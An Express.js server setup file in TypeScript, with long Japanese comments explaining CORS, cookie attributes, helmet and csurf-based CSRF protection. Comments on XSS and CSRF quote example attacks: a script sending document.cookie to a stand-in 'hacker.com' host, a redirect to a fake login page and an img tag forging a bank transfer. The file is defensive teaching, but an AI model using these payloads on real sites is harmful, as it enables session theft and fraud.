import boom from '@hapi/boom';
import cookieParser from 'cookie-parser';
import cors from 'cors';
import csrf from 'csurf';
import express, { NextFunction, Request, Response } from 'express';
import helmet from 'helmet';
import pinoHttp from 'pino-http';

import { convertToBoomInstance } from './errors';
import { _logger, options as loggerOptions } from './lib';
import { contentTypeFilter, sslFilter } from './middlewares';
import { ApiErrorResponse } from './responses';
import { devRouter, healthRouter, spreadsheetsRouter } from './routes';

const csrfConstants = {
  CSRF_SECRET_COOKIE_NAME: 'csrf_secret',
  CSRF_TOKEN_HEADER_NAME: 'x-csrf-token',
} as const;

const corsOptions: cors.CorsOptions = {
  // リクエストを許可するオリジンを制限する
  //   Origin ヘッダーはリクエストの際にブラウザによってオリジンの情報を自動付与される
  //   API サーバはこの情報を検証し、指定された Origin 以外からのリクエストを拒否する
  //   (クライアントが古いブラウザの場合は Origin ヘッダーが付与されないため一律で拒否される)
  //   なお、Access-Control-Allow-Credentials が有効な場合は Access-Control-Allow-Origin にワイルドカードを指定できない、必ず明示的に設定する
  origin: process.env.NODE_ENV === 'production' ? 'https://kawasawa.github.io' : 'http://localhost:3000',
  // リクエストを許可する HTTP メソッドを制限する
  //
  // ※ REST API の PATCH メソッドはほとんど使われていない
  //   一般的に登録系メソッドは、リソース全般の新規登録や送信を POST、それらの更新を PUT が利用される
  //   PATCH はほとんど利用されず、RFC でも削除と再定義を繰り返している
  //   PATCH の役割はリソースの一部更新、PUT はリソースの置換であり、
  //   例えばメールアドレス更新やパスワード再発行などは、厳密に言えば PATCH の方が理に適っている
  //   しかし、古いサーバでは PATCH をサポートしていないこともあり、そもそも PUT で特段問題が無いため、
  //   クライアント側も使い分けを意識せずに済む PUT にまとめてしまうことも多い
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  // リクエストを許可する HTTP ヘッダーを制限する
  allowedHeaders: ['Content-Type', csrfConstants.CSRF_TOKEN_HEADER_NAME],
  // クライアントが Cookie を HTTP ヘッダーに含めることを許可する
  //   Double Submit Cookie 方式で検証するため必要になる
  credentials: true,
}; //as const;

const cookieOptions: express.CookieOptions = {
  // クライアントに対して JavaScript からの Cookie アクセスを禁止する
  httpOnly: true,
  // クライアントに対して HTTPS 通信時のみ Cookie を送信するよう制限する
  secure: process.env.NODE_ENV === 'production',
  // クライアントに対してクロスオリジンにおける Cookie の送信を制限する
  //   strict: 同一オリジンのみ許可、lax: 同一オリジンは許可、別オリジンは GET, OPTIONS, HEAD で許可, none: すべてのオリジンに許可
  //   lax はメールや SNS のリンク、検索エンジンの結果から遷移（クロスサイトナビゲーション）した際も Cookie が送信されるため認証状態の維持などに役立つ
  //   none はクロスサイトリクエストに送信が許可されるため、OAuth 認証など外部サービスとの連携などに限定して使用する（必ず Secure 属性を設定する）
  //   利便性の観点から既定値に lax が指定されるブラウザが多いものの、デフォルトの挙動に差異があるため SameSite 属性は明示的に指定する
  sameSite: 'lax',
  // さらに上記を設定した状態でも防御が困難な Authenticated‐as‐Attacker という (攻撃者が正規の手順で認証した Cookie を被害者のブラウザに注入し情報を奪取する) 方法が登場した
  // これに対しては `__Secure-` と `__Host-` の特別なプレフィックスが用意され、これを付与された Cookie は Secure 属性等の指定のポリシーを満たさない場合ブラウザが受入を拒否する
  //   see: https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-cookie-prefixes-00
  //   see: https://www.mbsd.jp/research/20221005/cookie-prefix/
} as const;

const csrfOptions: {
  value?: ((req: Request) => string) | undefined;
  cookie?: csrf.CookieOptions;
  ignoreMethods?: string[];
  sessionKey?: string | undefined;
} = {
  // CSRF トークンの検証をパスする HTTP メソッドを指定する
  ignoreMethods: ['GET'],
  // Cookie のオプションを設定する
  //   このオプションを指定することで、csurf は Double Submit Cookie 方式で検証を実施する
  //   本来この方式は Cookie と HTTP カスタムヘッダーの両方に同じ値を格納するが csurf はこれを変形している
  //   csurf は CSRF トークンの作成に用いるシークレットを Cookie にセット、CSRF トークン本体は任意の方法で API が返却する
  //   クライアントはリクエストの際に CSRF トークンを HTTP ヘッダーに設定し、さらにブラウザが Cookie をリクエストに含めて送信する
  //   csurf はこのリクエストのシークレットを使い CSRF トークンを検証し、リクエストの正当性を確認する
  //   こうすることで Cookie ポリシーの httpOnly 属性を true の状態にしたまま CSRF トークンの検証を可能にしている
  cookie: {
    ...cookieOptions,
    // Max-Age はライブラリによって単位の解釈が異なるためが注意が必要
    // csurf 内部の cookie パッケージでは秒単位として、Express.js ではミリ秒単位として解釈される
    maxAge: 10 * 60, // 秒単位
    // CSRF シークレットを格納する Cookie の名称を指定する
    //   既定では '_csrf' がキー名として指定されている
    //   see: https://github.com/expressjs/csurf/blob/f4fa792167c2bc5ec3576cc8c4f2776df2336271/index.js#L245
    key: csrfConstants.CSRF_SECRET_COOKIE_NAME,
  },
  // CSRF トークンの取得先を指定する
  //   既定では body または query の _csrf、あるいは headers の csrf-token, xsrf-token, x-csrf-token, x-xsrf-token から取得される
  //   see: https://github.com/expressjs/csurf/blob/f4fa792167c2bc5ec3576cc8c4f2776df2336271/index.js#L130
  value: (req) => req.header(csrfConstants.CSRF_TOKEN_HEADER_NAME) || '',
}; //as const;

export const createApp = () => {
  const app = express();

  // ログ出力
  app.use(pinoHttp({ ...loggerOptions.pinoHttp, logger: _logger }));
  // セキュリティヘッダー付与
  //   このミドルウェアはレスポンスの返却が発生する処理より前に設定する
  //   XSS対策関連のヘッダー (X-XSS-Protection, X-Content-Type-Options, Content-Security-Policy, Cross-Origin-Embedder-Policy, Cross-Origin-Resource-Policy 等) を含む
  //   併せて X-Powered-By が除去される
  // NOTE: XSS は攻撃者が投稿した悪意のある内容 (スクリプト) を被害者のブラウザで実行させられる手法
  //   概要
  //     何らかの登録画面を持ち、そこで登録した内容を閲覧できる Web サイトであれば、 XSS はどこでも発生しうる
  //     入力フォームが HTML タグの入力を受け付け、かつ登録内容の表示の際に HTML タグがエスケープされずレンダリングされると、
  //     ブラウザがこれを解釈することでスクリプトが実行されてしまう
  //   対策
  //     抜本対応は表示内容をエスケープすること
  //       スクリプトを実行されると様々な攻撃ができてしまう
  //     HttpOnly 属性で Cookie へのアクセスを、 Secure 属性で Cookie の盗聴を防ぐ
  //       直接的な XSS の対策ではないが Cookie を盗ませないように対策を講じる
  //       なお、XSS では Cookie を直接奪取される攻撃が予想されるため SameSite 属性では防げない
  //   事例
  //     昔の掲示板等でよくあった手法である
  //     被害者のブラウザから Cookie を取得して転送したり...
  //       `<script>fetch("https://hacker.com/steal?cookie="+document.cookie);</script>`
  //     無理やり偽サイトに遷移したり...
  //       `<script>window.location.href="https://hacker.com/fake-login";</script>`
  app.use(helmet());
  // CORS対応
  //
  // NOTE: CORS 制約はブラウザに対してリソースアクセスの可否を指示する仕組み
  //   背景
  //     ブラウザには JavaScript から異なるオリジンのリソースに対するアクセスを制限する仕組み (同一オリジンポリシー) が備わっている
  //     しかし、昨今では API のみを提供するサービスが増え、同一オリジンポリシーによる厳しい制限が問題となることが多くなった
  //   概要
  //     CORS 制約は同一オリジンポリシーを緩和するための仕組みで、ブラウザに対して異なるオリジンからのリソースアクセスの可否を指示できる
  //     CORS 制約を適切に定義することで、API からレスポンスを JavaScript が渡される前にブラウザによってブロックされる
  //     これにより、例えば別のサイトで発生した XSS によってリクエストが送信されても、そのレスポンスが JavaScript に読み取られることは無い
  //     また、プリフライトリクエストが発生する場合は、CSRF による偽ドメインからのリクエスト送信も防ぐことができる
  //   補足
  //     CORS 制約はセキュリティ対策の一環として有用ではあるが、ブラウザ側の動きを制限するだけであるため、本質的な防御策に放っていない
  //     上記の通り、被害者が意図せず送信してしまうリクエストには有効があるが、攻撃者が直接ブラウザ外から送信するリクエストには効果が無い
  //   流れ
  //     リクエストの種類によって動作が異なる
  //     A. シンプルリクエスト
  //       (語弊を承知でざっくり言えば) form から送信されるリクエストがこれにあたる
  //         1. ブラウザがリクエストにオリジン情報を追加してサーバに送信
  //         2. サーバがリクエストを処理
  //         3. サーバーがレスポンスに CORS ヘッダーを追加
  //         4. ブラウザが CORS ヘッダーを確認し、JavaScript にレスポンスを渡すかを判断
  //       ※リクエスト自体はサーバで処理されてしまう
  //     B. プリフライトリクエスト
  //       シンプルリクエストの条件を満たさない場合、
  //       事前に「プリフライトリクエスト」と呼ばれる通信がブラウザによって自動的に実施される
  //         1. 本リクエストの前に、ブラウザが自動的に OPTIONS メソッドでプリフライトリクエストを送信
  //         2. サーバが CORS ヘッダーで許可するメソッドやヘッダーを示す応答を返す
  //         3. ブラウザは CORS ヘッダーを確認し、許可されていれば本来のリクエストを送信
  //       ※リクエストの送信前にブロックが可能
  app.use(cors(corsOptions));
  // Content-Typeフィルタ
  //   Content-Type を "application/json` に限定する
  app.use(contentTypeFilter('application/json', ['GET']));
  // SSLフィルタ
  //   https にリダイレクトする
  app.all('*', sslFilter);
  // Cookieパーサ
  //   csurf が Cookie 経由で CSRF トークン及びシークレットを授受する場合、事前に cookie-parser を初期化する必要がある
  //   see: https://github.com/expressjs/csurf/blob/f4fa792167c2bc5ec3576cc8c4f2776df2336271/README.md
  app.use(cookieParser());
  // JSONパーサ
  app.use(express.json());
  // Bodyパーサ
  app.use(express.urlencoded({ extended: true }));

  // ヘルスチェック
  app.use('/health', healthRouter);

  // NOTE: CSRF はユーザの認証情報 (Cookie) を流用し、意図しないリクエストの送信させる手法
  //   概要
  //     ログイン済み (つまりブラウザの Cookie に認証情報が保持された) ユーザが偽サイトに誘導され、
  //     Web ページを開くと Cookie を流用して悪意のあるリクエストを送信 (POST) してしまう手法
  //   対策
  //     SameSite 属性で Cookie の送信を防止する
  //       SameSite 属性で異なるオリジン (ここでは攻撃者のサイトのオリジン) からの Cookie 送信を防ぐことができる
  //       攻撃者は Cookie にアクセスしていないため HttpOnly 属性は対策にならない
  //       宛先が正規 (SSL認証を受けた) のサイトであればブラウザは自動で Cookie を付与するため Secure 属性では防げない
  //     CSRF トークンで正規のサーバで生成されたフォームであることを明示する
  //       サーバが HTML を生成する際に CSRF トークンを埋め込み、リクエストを受けた際にサーバでそれを検証し攻撃を防ぐ
  //   事例
  //     ページの表示と同時に銀行送金をリクエストしたり...
  //       `<img src="https://hogebank.com/transfer?to=attacker&amount=1000000">`
  //   余談
  //     SSRF はこれとは異なる
  //     SSRF (Server-Side Request Forgery) はサーバを踏み台にして、意図しないリクエストを送信させる手法
  //     例えば、サーバサイドで URL を受け取り、それに対してリクエストを送信する処理がある場合、
  //     サーバサイドでの URL の検証が甘ければ、攻撃者は任意のリクエストを送信できてしまう
  //     実際、著名なライブラリである Axios でこの攻撃につながる脆弱性が発見されたことがある
  //       see: https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6
  //   参考
  //     - JSON を送信する場合はプリフライトリクエストが発生する
  //       see: https://teratail.com/questions/347139#reply-476588
  //         まず前提として、フォームからAPIサーバに送信されるデータはaxios経由でJSON形式で送信されると想定しています。
  //         この場合、Content-Type: application/json となるので、CORSの単純リクエストの要件から外れ、CSRF攻撃の前にプリフライトリクエストが飛びます。
  //         これに対してCORSの設定をしていなければPOST送信はされず、CSRF攻撃は成立しません。
  //         まとめると、以下がしてあれば、CSRF攻撃はできません。
  //           ・JSONデータを受け取る際にContent-Typeがapplication/jsonであることを確認している
  //           ・CORSの設定をしていないか、正しいオリジンのみを受け入れるように設定している
  //     - 模倣サイトでは CSRF トークンをブラウザから取得できない
  //       see: https://qiita.com/maruloop/items/e14d02299bd136f4b1fc
  //         Q.攻撃者サイトで、トークンAPIから目的のAPIまでの一連の流れをそのままやれば、攻撃出来ちゃうんじゃない？
  //         A.とても良い質問ですね、しかし大丈夫です。攻撃できません。
  //           前提知識にもあったSame Origin Policyによって、攻撃者はトークンを取得することが出来ません。
  //           正確には、トークンAPIへのリクエストは成功し、トークンは払い出されますが、ブラウザがレスポンスを読み取らせてくれません。
  //         Q.トークンAPIが無防備じゃないですか？トークンは払い出されてもいいんですか？
  //         A.実装によりますが、大体大丈夫です。
  //           まずセキュリティ上の問題はないでしょう。最初の質問にあるように、Same Origin Policyによって防がれます。
  //           次にサービス運用上の問題ですが、CSRFトークンに期限があれば、大量のトークンを嫌がらせのように作られたとしても
  //           期限を迎えたものから削除すればよいため、サービス影響は非常に少ないでしょう。
  //           期限がなくサーバー側にトークンを無限に保存するような場合は、以下のような対策が必要そうですね。
  //             ・十分なスケーラビリティのあるデータストアに保存する
  //             ・大量のリクエストを制限するような機構を入れる
  //           また、サーバー側にCSRFトークンを保存しない、ということもJSON Web Tokenを使うとできます。
  //     - SameSite 属性で Cookie の送信を防止できる
  //       see: https://azukiazusa.dev/blog/why-use-server-actions/#csrf
  //         多くのフレームワークでは CSRF トークンを用いることで CSRF を対策していますが、Next.js では CSRF トークンを用いた対策は実装されておりません。
  //         その理由は、現代のブラウザは Same-Site クッキーがデフォルトであるため、これだけでほとんどの CSRF 攻撃を防ぐことができると考えられているためです。
  //         さらに追加の保護として、`Origin`ヘッダーと`Host`ヘッダーの比較による検証も行われます。
  //         もしこれらの値が一致しない場合には、アクションは拒否されることになります。
  //     - 認証情報は Cookie に保存するのが一般的
  //       see: https://numb86-tech.hatenablog.com/entry/2019/02/13/221458
  //         認証情報をどこに保存するのか、という問題にも軽く触れておく。
  //         ここでいう認証情報とは、セッションIDやトークンなどの、そのユーザーであることを証明するための情報。これがあることで、サーバー側に認証・認可してもらえる。
  //         保存場所の選択肢は2つ。まずはCookie。かつてはこれしか選択肢はなかった。だが現在では、Web Storageという仕組みもある。
  //         Cookieの利点は、HttpOnly属性を有効にすることで、JavaScriptから読み込まれることを禁止できること。
  //         これにより、XSSの脆弱性があったとしても、そこからCookieを読み込まれる心配がない。
  //         また、認証に使うことが一般的であり、そのためのノウハウやライブラリが豊富にある、というのも利点だと思う。
  //         欠点は、リクエストを送る度に自動的にCookieの情報も一緒に送信されてしまうこと。
  //         例えばhttp://example.comから渡されたCookieは、http://example.comにリクエストを送る度に自動的に送信されてしまう。多くのCSRFは、この仕組みを悪用したものだと言える。
  const csrfFilter = csrf(csrfOptions);

  // ルーティング
  app.use('/dev', csrfFilter, devRouter);
  app.use('/spreadsheets', csrfFilter, spreadsheetsRouter);

  // NotFound ハンドラ
  app.use((req, res, next) => next(boom.notFound('requested entity was not found.')));

  // グローバルエラーハンドラ
  /* eslint-disable-next-line @typescript-eslint/no-explicit-any, @typescript-eslint/no-unused-vars */
  app.use((err: any, req: Request, res: Response, next: NextFunction) => {
    const b = convertToBoomInstance(err);
    const body = {
      error: {
        code: b.output.payload.statusCode,
        message: b.output.payload.message,
        status: b.output.payload.error,
      },
    } as ApiErrorResponse;
    res.status(b.output.statusCode).json(body);
  });

  return app;
};
